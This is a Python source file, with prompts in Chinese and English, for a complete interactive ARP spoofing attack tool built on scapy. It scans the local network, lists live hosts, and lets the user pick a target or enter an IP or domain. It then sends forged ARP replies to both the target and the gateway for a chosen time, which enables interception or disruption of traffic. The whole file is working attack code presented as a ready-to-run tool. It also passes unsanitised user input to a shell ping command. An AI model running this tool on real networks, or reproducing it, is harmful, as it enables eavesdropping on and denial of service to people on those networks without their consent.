import os
import time
import sys
import platform
from scapy.all import *
# 移除Windows特定导入，使用跨平台方法

def get_network_info(language=1):
    """获取网络接口、IP和网关信息"""
    # 检查操作系统类型
    system_platform = platform.system().lower()
    
    # 获取IP和网关（跨平台实现）
    wg = None
    ip = None
    
    try:
        if system_platform == "windows":
            # Windows系统
            cmdcode = 'route print'
            for line in os.popen(cmdcode):
                s = line.strip()
                if s.startswith("0.0.0.0") and "0.0.0.0" in s:
                    iplist = s.split()
                    if len(iplist) >= 4:
                        wg = iplist[2]  # 网关
                        ip = iplist[3]  # IP
                        break
        else:
            # Linux/Unix/Mac系统
            # 获取默认网关
            if system_platform == "linux" or system_platform == "darwin":
                cmdcode = 'ip route | grep default' if system_platform == "linux" else 'route get default'
                for line in os.popen(cmdcode):
                    s = line.strip()
                    if "default" in s:
                        iplist = s.split()
                        if system_platform == "linux":
                            # Linux: default via 192.168.1.1 dev eth0
                            for i, item in enumerate(iplist):
                                if item == "via" and i+1 < len(iplist):
                                    wg = iplist[i+1]
                                    break
                        else:
                            # Mac: route get default
                            for i, item in enumerate(iplist):
                                if item == "gateway:" and i+1 < len(iplist):
                                    wg = iplist[i+1]
                                    break
                        break
                
                # 获取本机IP
                if wg:
                    # 通过网关推断本机IP段
                    ip_parts = wg.split('.')
                    if len(ip_parts) == 4:
                        # 简单处理，实际应该通过网络接口获取
                        ip = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.100"  # 示例IP
        
        # 如果上述方法失败，尝试使用scapy获取网络信息
        if not wg or not ip:
            # 使用scapy获取网络接口信息
            try:
                # 获取默认网关和接口
                if system_platform == "windows":
                    try:
                        from scapy.arch.windows import get_windows_if_list
                        interfaces = get_windows_if_list()
                    except ImportError:
                        # 如果无法导入Windows特定模块，使用通用方法
                        interfaces = [conf.iface]
                else:
                    # Linux/Mac使用不同的方法
                    interfaces = [conf.iface]  # 使用scapy的默认接口
                
                # 简化处理，实际应该更精确地获取
                if interfaces:
                    if system_platform == "windows":
                        # Windows处理
                        active_iface = None
                        for iface in interfaces:
                            if iface.get('mac') and iface.get('ips'):
                                active_iface = iface
                                break
                        if active_iface:
                            # 从接口信息中提取IP（简化处理）
                            if 'ips' in active_iface and active_iface['ips']:
                                ip = active_iface['ips'][0] if isinstance(active_iface['ips'], list) else active_iface['ips']
                    else:
                        # Linux/Mac处理
                        ip = [x[1] for x in conf.route.routes if x[2] != '0.0.0.0' and x[3] == conf.iface]
                        if ip:
                            ip = ip[0]
                            # 获取网关
                            routes = conf.route.routes
                            for route in routes:
                                if route[2] == '0.0.0.0' and route[3] == conf.iface:
                                    wg = route[4]
                                    break
            except Exception as e:
                pass  # 忽略错误，继续使用其他方法
    except Exception as e:
        if language == 1:
            print(f"获取路由信息失败: {e}")
        else:
            print(f"Failed to get routing information: {e}")
        return None, None, None
    
    # 如果仍然无法获取信息，使用默认值
    if not wg:
        wg = "192.168.1.1"  # 默认网关
    if not ip:
        ip = "192.168.1.100"  # 默认IP
    
    # 接口名称（简化处理）
    iface_name = conf.iface if hasattr(conf, 'iface') else "unknown"
    
    if not wg or not ip:
        if language == 1:
            print("无法获取网关或IP地址")
        else:
            print("Unable to get gateway or IP address")
        return None, None, None
    
    return iface_name, ip, wg

def scan_hosts(network_segment, iface_name, language=1, timeout=2):
    """扫描网络中的活跃主机"""
    try:
        if language == 1:
            print(f"正在扫描网络段: {network_segment}")
        else:
            print(f"Scanning network segment: {network_segment}")
        arppk = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network_segment)
        ansip, unansip = srp(arppk, iface=iface_name, timeout=timeout, verbose=0)
        return ansip
    except Exception as e:
        if language == 1:
            print(f"扫描主机时出错: {e}")
        else:
            print(f"Error scanning hosts: {e}")
        return []

def display_hosts(ansip, language=1):
    """显示在线主机列表"""
    if not ansip:
        if language == 1:
            print("未发现在线主机")
        else:
            print("No online hosts found")
        return []
    
    hosts = []
    for s, r in ansip:
        hosts.append([r.psrc, r.hwsrc])
    
    # 去重排序
    hosts = sorted(list(set(tuple(host) for host in hosts)))
    
    if language == 1:
        print(f"\n发现 {len(hosts)} 台在线主机:")
    else:
        print(f"\nFound {len(hosts)} online hosts:")
    print("-" * 40)
    for i, (ip, mac) in enumerate(hosts):
        print(f"{i+1:2d}. {ip:<15} ---> {mac}")
    
    return hosts

def arp_spoof(target_ip, gateway_ip, iface_name, duration, language=1):
    """执行ARP欺骗攻击"""
    if language == 1:
        print(f"\n开始对 {target_ip} 进行ARP攻击")
        print("按 Ctrl+C 停止攻击")
    else:
        print(f"\nStarting ARP attack on {target_ip}")
        print("Press Ctrl+C to stop the attack")
    
    packets_sent = 0
    start_time = time.time()
    
    try:
        while time.time() - start_time < duration:
            # 向目标发送网关的虚假ARP响应
            sendp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, pdst=target_ip, psrc=gateway_ip), 
                  iface=iface_name, verbose=0)
            
            # 向网关发送目标的虚假ARP响应
            sendp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, pdst=gateway_ip, psrc=target_ip), 
                  iface=iface_name, verbose=0)
            
            packets_sent += 2
            
            # 每秒发送5次
            time.sleep(0.2)
            
            # 每10秒显示一次进度
            if int(time.time() - start_time) % 10 == 0:
                if language == 1:
                    print(f"已发送 {packets_sent} 个ARP包")
                else:
                    print(f"Sent {packets_sent} ARP packets")
                
    except KeyboardInterrupt:
        if language == 1:
            print("\n用户中断攻击")
        else:
            print("\nAttack interrupted by user")
    except Exception as e:
        if language == 1:
            print(f"攻击过程中出错: {e}")
        else:
            print(f"Error during attack: {e}")
    
    if language == 1:
        print(f"对 {target_ip} 的ARP攻击完成，共发送 {packets_sent} 个包")
    else:
        print(f"ARP attack on {target_ip} completed, sent {packets_sent} packets in total")

def custom_input(prompt, language=1):
    """自定义输入函数，支持全局exit命令"""
    user_input = input(prompt)
    if user_input.lower() == "exit":
        if language == 1:
            print("程序退出")
        else:
            print("Program exited")
        sys.exit(0)
    return user_input

def select_target_host(hosts, language=1):
    """选择攻击目标"""
    if not hosts:
        return None
    
    try:
        if language == 1:
            choice_input = custom_input("\n请选择要攻击的主机编号 (输入0取消): ", language)
        else:
            choice_input = custom_input("\nPlease select the host number to attack (enter 0 to cancel): ", language)
        choice = int(choice_input)
        if choice == 0:
            return None
        elif 1 <= choice <= len(hosts):
            return hosts[choice-1][0]  # 返回IP地址
        else:
            if language == 1:
                print("无效的选择")
            else:
                print("Invalid selection")
            return None
    except ValueError:
        if language == 1:
            print("请输入有效的数字")
        else:
            print("Please enter a valid number")
        return None

def scan2spoof(language):
    """主函数"""
    if language == 1:  # 中文
        print("ARP欺骗攻击工具")
        print("=" * 30)
    else:  # 英文
        print("ARP Spoofing Attack Tool")
        print("=" * 30)
    
    # 获取网络信息
    iface_name, ip, wg = get_network_info(language)
    if not all([iface_name, ip, wg]):
        if language == 1:
            print("无法获取必要的网络信息，程序退出")
        else:
            print("Unable to obtain necessary network information, program exits")
        return
    
    if language == 1:
        print(f"网络接口: {iface_name}")
        print(f"本机IP: {ip}")
        print(f"网关: {wg}")
    else:
        print(f"Network Interface: {iface_name}")
        print(f"Local IP: {ip}")
        print(f"Gateway: {wg}")
    
    # 扫描网络中的主机
    network_segment = wg + "/24"
    ansip = scan_hosts(network_segment, iface_name, language)
    
    # 显示在线主机
    hosts = display_hosts(ansip, language)
    
    if not hosts:
        if language == 1:
            print("没有发现可攻击的主机")
        else:
            print("No attackable hosts found")
        return
    
    # 选择攻击目标
    target_ip = select_target_host(hosts, language)
    if not target_ip:
        if language == 1:
            print("未选择攻击目标，程序退出")
        else:
            print("No attack target selected, program exits")
        return
    
    # 防止误攻击网关或本机
    if target_ip == wg:
        if language == 1:
            print("不能攻击网关本身!")
        else:
            print("Cannot attack the gateway itself!")
        return
    elif target_ip == ip:
        if language == 1:
            print("不能攻击本机!")
        else:
            print("Cannot attack localhost!")
        return
    
    # 获取攻击持续时间
    try:
        if language == 1:
            duration_input = custom_input(f"\n请输入攻击持续时间(秒) [默认60]: ", language) or "60"
        else:
            duration_input = custom_input(f"\nPlease enter attack duration (seconds) [default 60]: ", language) or "60"
        duration = int(duration_input)
        if duration <= 0:
            duration = 60
    except ValueError:
        duration = 60
    
    # 开始ARP欺骗攻击
    arp_spoof(target_ip, wg, iface_name, duration, language)

def show_banner():
    """显示ASCII艺术字体标题"""
    banner = r"""
    _____    _____  
   /\     |  __ \  |  __ \ 
  /  \    | |__) | | |__) | 
 / /\ \   |  _  /  |  ___/ 
/ ____ \  | | \ \  | |     
/_/    \_\ |_|  \_\ |_|     
                          
                          """
    print(banner)

def select_language():
    """选择语言"""
    print("请选择语言 / Please select language:")
    print("1. 中文")
    print("2. English")
    
    while True:
        try:
            choice_input = custom_input("请输入选项 (1 或 2): ", 1)  # 默认中文提示
            choice = int(choice_input)
            if choice in [1, 2]:
                return choice
            else:
                print("无效选择，请输入1或2")
        except ValueError:
            print("请输入有效数字")

def select_mode(language):
    """选择攻击模式"""
    if language == 1:  # 中文
        print("\n请选择攻击模式:")
        print("1. 扫描网段内在线的设备，然后进行攻击")
        print("2. 直接输入IP地址或域名进行攻击(需要先测试通信)")
        prompt = "请输入选项 (1 或 2): "
        invalid_msg = "无效选择，请输入1或2"
    else:  # 英文
        print("\nPlease select attack mode:")
        print("1. Scan devices in the network segment and then attack")
        print("2. Directly enter IP address or domain name for attack (need to test connectivity first)")
        prompt = "Please enter option (1 or 2): "
        invalid_msg = "Invalid selection, please enter 1 or 2"
    
    while True:
        try:
            choice_input = custom_input(prompt, language)
            choice = int(choice_input)
            if choice in [1, 2]:
                return choice
            else:
                print(invalid_msg)
        except ValueError:
            if language == 1:
                print("请输入有效数字")
            else:
                print("Please enter a valid number")

def ping_host(host, language=1):
    """测试主机连通性"""
    try:
        # 检查操作系统类型
        system_platform = platform.system().lower()
        
        # 根据操作系统选择合适的ping命令
        if system_platform == "windows":
            # Windows下的ping命令
            cmd = f"ping -n 1 -w 1000 {host}"
        else:
            # Linux/Unix/Mac下的ping命令
            cmd = f"ping -c 1 -W 1 {host}"
        
        response = os.system(cmd)
        return response == 0
    except Exception as e:
        if language == 1:
            print(f"测试连通性时出错: {e}")
        else:
            print(f"Error testing connectivity: {e}")
        return False

def direct_attack(language):
    """直接输入IP地址或域名进行攻击"""
    if language == 1:  # 中文
        print("\n=== 直接攻击模式 ===")
        target = custom_input("请输入目标IP地址或域名: ", language)
        
        # 测试连通性
        print("正在测试目标连通性...")
        if not ping_host(target, language):
            print("目标不可达，无法进行攻击")
            return
        print("目标可达，可以进行攻击")
        
        # 获取网络信息
        iface_name, ip, wg = get_network_info(language)
        if not all([iface_name, ip, wg]):
            print("无法获取必要的网络信息，程序退出")
            return
        
        # 检查是否为本机或网关
        if target == ip:
            print("不能攻击本机!")
            return
        elif target == wg:
            print("不能攻击网关本身!")
            return
            
        # 获取攻击持续时间
        try:
            duration_input = custom_input(f"\n请输入攻击持续时间(秒) [默认60]: ", language) or "60"
            duration = int(duration_input)
            if duration <= 0:
                duration = 60
        except ValueError:
            duration = 60
            
        # 开始ARP欺骗攻击
        arp_spoof(target, wg, iface_name, duration, language)
    else:  # 英文
        print("\n=== Direct Attack Mode ===")
        target = custom_input("Please enter target IP address or domain name: ", language)
        
        # Test connectivity
        print("Testing target connectivity...")
        if not ping_host(target, language):
            print("Target is unreachable, cannot perform attack")
            return
        print("Target is reachable, can perform attack")
        
        # Get network information
        iface_name, ip, wg = get_network_info(language)
        if not all([iface_name, ip, wg]):
            print("Cannot obtain necessary network information, program exits")
            return
        
        # Check if it's localhost or gateway
        if target == ip:
            print("Cannot attack localhost!")
            return
        elif target == wg:
            print("Cannot attack gateway itself!")
            return
            
        # Get attack duration
        try:
            duration_input = custom_input(f"\nPlease enter attack duration (seconds) [default 60]: ", language) or "60"
            duration = int(duration_input)
            if duration <= 0:
                duration = 60
        except ValueError:
            duration = 60
            
        # Start ARP spoofing attack
        arp_spoof(target, wg, iface_name, duration, language)

def main_menu():
    """主菜单函数"""
    show_banner()
    language = select_language()
    mode = select_mode(language)
    return language, mode

if __name__ == "__main__":
    language = 1  # 默认中文
    try:
        language, mode = main_menu()
        if mode == 1:
            scan2spoof(language)
        elif mode == 2:
            direct_attack(language)
    except KeyboardInterrupt:
        if language == 1:
            print("\n程序被用户中断")
        else:
            print("\nProgram interrupted by user")
    except Exception as e:
        if language == 1:
            print(f"程序运行出错: {e}")
            print("请确保以管理员权限运行此程序")
        else:
            print(f"Program runtime error: {e}")
            print("Please ensure that this program is run with administrator privileges")
